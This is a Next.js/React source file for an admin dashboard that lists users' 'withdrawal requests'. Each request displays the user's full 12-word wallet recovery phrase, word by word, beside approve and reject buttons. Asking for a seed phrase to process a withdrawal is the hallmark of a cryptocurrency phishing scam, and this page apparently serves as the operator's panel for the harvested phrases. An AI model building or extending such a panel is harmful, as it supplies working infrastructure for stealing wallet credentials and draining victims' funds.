"use client";

import { useState, useEffect } from "react";
import { useSession } from "next-auth/react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { 
  FaUser, 
  FaDollarSign, 
  FaShieldAlt,
  FaCheckCircle,
  FaTimesCircle,
  FaArrowUp,
  FaEye
} from 'react-icons/fa';

const cardVariants = {
  hidden: { opacity: 0, y: 40 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.6 } }
};

interface WithdrawalRequest {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  amount: number;
  walletType: string;
  walletName: string;
  recoveryPhrase: string;
  status: 'pending' | 'approved' | 'rejected' | 'completed';
  timestamp: string;
  adminNotes?: string;
  processedAt?: string;
}

export default function PhrasePage() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [withdrawals, setWithdrawals] = useState<WithdrawalRequest[]>([]);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);

  // Function to fetch all withdrawal requests
  const fetchWithdrawals = async () => {
    try {
      setLoading(true);
      const response = await fetch('/api/admin/withdrawals', {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        setWithdrawals(data.withdrawals);
        setLastUpdated(new Date());
        console.log('✅ Withdrawals fetched successfully:', data.withdrawals);
      } else {
        console.error('❌ Failed to fetch withdrawals:', response.status);
      }
    } catch (error) {
      console.error('❌ Error fetching withdrawals:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (status === "unauthenticated") {
      router.push("/login");
    } else if (status === "authenticated" && session?.user?.role !== "admin") {
      router.push("/dashboard");
    } else if (status === "authenticated" && session?.user?.role === "admin") {
      fetchWithdrawals();
      
      // Set up auto-refresh every 30 seconds
      const interval = setInterval(fetchWithdrawals, 30000);
      return () => clearInterval(interval);
    }
  }, [status, session, router]);

  if (status === "loading") {
    return (
      <div className="min-h-screen bg-[var(--background)] flex items-center justify-center">
        <div className="w-16 h-16 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin" />
      </div>
    );
  }

  if (!session || session?.user?.role !== "admin") {
    return null;
  }

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
    }).format(amount);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'pending': return 'bg-yellow-100 text-yellow-800';
      case 'approved': return 'bg-green-100 text-green-800';
      case 'rejected': return 'bg-red-100 text-red-800';
      case 'completed': return 'bg-blue-100 text-blue-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const handleStatusUpdate = async (withdrawalId: string, newStatus: string) => {
    try {
      const response = await fetch('/api/admin/withdrawals/update', {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          withdrawalId,
          status: newStatus
        }),
      });

      if (response.ok) {
        alert(`Withdrawal ${newStatus} successfully!`);
        fetchWithdrawals(); // Refresh the list
      } else {
        alert('Failed to update withdrawal status');
      }
    } catch (error) {
      console.error('Error updating withdrawal status:', error);
      alert('Error updating withdrawal status');
    }
  };

  return (
    <main className="min-h-screen bg-[var(--background)] text-[var(--foreground)] pt-20">
      {/* Header */}
      <header className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <h1 className="text-2xl font-bold text-[var(--foreground)] flex items-center gap-3">
            <FaShieldAlt className="text-[var(--brand)]" />
            Recovery Phrase Management
          </h1>
          <div className="flex items-center gap-4">
            <button 
              onClick={fetchWithdrawals}
              disabled={loading}
              className="px-3 py-1 bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white text-sm rounded-lg transition-colors flex items-center gap-2 disabled:opacity-50"
            >
              {loading ? (
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <FaArrowUp size={14} />
              )}
              Refresh
            </button>
            <div className="flex items-center gap-4 text-sm text-[var(--foreground)]/60">
              {lastUpdated && (
                <div className="text-xs">
                  <span className="text-[var(--foreground)]/40">Last updated: </span>
                  <span className="text-[var(--foreground)]/60">
                    {lastUpdated.toLocaleTimeString()}
                  </span>
                </div>
              )}
              <div className="flex items-center gap-2">
                <FaUser size={16} />
                <span>{session.user?.name || 'Admin'}</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Summary Stats */}
        <motion.div
          initial="hidden"
          animate="visible"
          variants={cardVariants}
          className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8"
        >
          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Requests</h3>
              <FaEye className="text-[var(--brand)]" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {withdrawals.length}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              All withdrawal requests
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Pending</h3>
              <FaEye className="text-yellow-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {withdrawals.filter(w => w.status === 'pending').length}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              Awaiting approval
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Amount</h3>
              <FaDollarSign className="text-green-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {formatCurrency(withdrawals.reduce((sum, w) => sum + w.amount, 0))}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              Combined withdrawal value
            </div>
          </div>

          <div className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Unique Users</h3>
              <FaUser className="text-blue-500" size={20} />
            </div>
            <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
              {new Set(withdrawals.map(w => w.userId)).size}
            </div>
            <div className="text-sm text-[var(--foreground)]/60">
              Different users
            </div>
          </div>
        </motion.div>

        {/* Withdrawal Requests List */}
        <motion.div
          initial="hidden"
          animate="visible"
          variants={cardVariants}
          className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
        >
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
            <h2 className="text-xl font-bold text-[var(--foreground)]">Withdrawal Requests & Recovery Phrases</h2>
            <div className="text-sm text-[var(--foreground)]/60">
              Manage all withdrawal requests and view 12-word recovery phrases
            </div>
          </div>

          <div className="overflow-x-auto">
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <div className="w-8 h-8 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin"></div>
                <span className="ml-3 text-[var(--foreground)]/60">Loading withdrawal requests...</span>
              </div>
            ) : withdrawals.length === 0 ? (
              <div className="text-center py-12">
                <div className="text-[var(--foreground)]/40 mb-2">No withdrawal requests found</div>
                <div className="text-sm text-[var(--foreground)]/60">Users will appear here when they submit withdrawal requests</div>
              </div>
            ) : (
              <div className="space-y-6">
                {withdrawals.map((withdrawal) => (
                  <div key={withdrawal.id} className="bg-[var(--background)]/50 p-6 rounded-lg border border-[var(--brand)]/20">
                    {/* Header with User Info and Status */}
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-[var(--brand)]/20 rounded-full flex items-center justify-center">
                          <FaUser className="text-[var(--brand)]" size={16} />
                        </div>
                        <div>
                          <div className="font-medium text-[var(--foreground)]">{withdrawal.userName}</div>
                          <div className="text-sm text-[var(--foreground)]/60">{withdrawal.userEmail}</div>
                        </div>
                      </div>
                      <div className="flex items-center gap-3">
                        <span className={`inline-flex items-center px-3 py-1 rounded-full text-sm font-medium ${getStatusColor(withdrawal.status)}`}>
                          {withdrawal.status}
                        </span>
                        <div className="text-sm text-[var(--foreground)]/60">
                          {formatDate(withdrawal.timestamp)}
                        </div>
                      </div>
                    </div>

                    {/* Request Details */}
                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
                      <div className="bg-[var(--card-bg)] p-3 rounded-lg">
                        <div className="text-sm text-[var(--foreground)]/60 mb-1">Amount</div>
                        <div className="font-semibold text-[var(--foreground)]">{formatCurrency(withdrawal.amount)}</div>
                      </div>
                      <div className="bg-[var(--card-bg)] p-3 rounded-lg">
                        <div className="text-sm text-[var(--foreground)]/60 mb-1">Wallet App</div>
                        <div className="font-semibold text-[var(--foreground)]">{withdrawal.walletName}</div>
                        <div className="text-xs text-[var(--foreground)]/60">Type: {withdrawal.walletType}</div>
                      </div>
                      <div className="bg-[var(--card-bg)] p-3 rounded-lg">
                        <div className="text-sm text-[var(--foreground)]/60 mb-1">Request ID</div>
                        <div className="font-mono text-xs text-[var(--foreground)]">{withdrawal.id}</div>
                      </div>
                      <div className="bg-[var(--card-bg)] p-3 rounded-lg">
                        <div className="text-sm text-[var(--foreground)]/60 mb-1">User ID</div>
                        <div className="font-mono text-xs text-[var(--foreground)]">{withdrawal.userId}</div>
                      </div>
                    </div>

                    {/* Recovery Phrase Section */}
                    <div className="bg-[var(--card-bg)] p-4 rounded-lg border border-[var(--brand)]/20 mb-4">
                      <div className="flex items-center gap-2 mb-3">
                        <FaShieldAlt className="text-[var(--brand)]" size={16} />
                        <span className="font-semibold text-[var(--foreground)]">12-Word Recovery Phrase</span>
                      </div>
                      <div className="text-xs text-[var(--foreground)]/60 mb-3">
                        User&apos;s recovery phrase for verification - handle with extreme care
                      </div>
                      <div className="grid grid-cols-3 gap-2">
                        {withdrawal.recoveryPhrase.split(' ').map((word, index) => (
                          <div key={index} className="flex items-center gap-2">
                            <span className="w-6 h-6 bg-[var(--brand)] text-white text-xs rounded-full flex items-center justify-center">
                              {index + 1}
                            </span>
                            <span className="font-mono text-sm bg-[var(--background)] px-3 py-2 rounded border border-[var(--brand)]/20 flex-1 text-center">
                              {word}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Action Buttons */}
                    {withdrawal.status === 'pending' && (
                      <div className="flex gap-3">
                        <button
                          onClick={() => handleStatusUpdate(withdrawal.id, 'approved')}
                          className="flex-1 px-4 py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg transition-colors flex items-center justify-center gap-2"
                        >
                          <FaCheckCircle size={16} />
                          Approve Withdrawal
                        </button>
                        <button
                          onClick={() => handleStatusUpdate(withdrawal.id, 'rejected')}
                          className="flex-1 px-4 py-2 bg-red-500 hover:bg-red-600 text-white rounded-lg transition-colors flex items-center justify-center gap-2"
                        >
                          <FaTimesCircle size={16} />
                          Reject Withdrawal
                        </button>
                      </div>
                    )}

                    {withdrawal.status !== 'pending' && (
                      <div className="text-center py-2">
                        <span className="text-sm text-[var(--foreground)]/60">
                          Status: {withdrawal.status.charAt(0).toUpperCase() + withdrawal.status.slice(1)}
                        </span>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        </motion.div>
      </div>
    </main>
  );
}



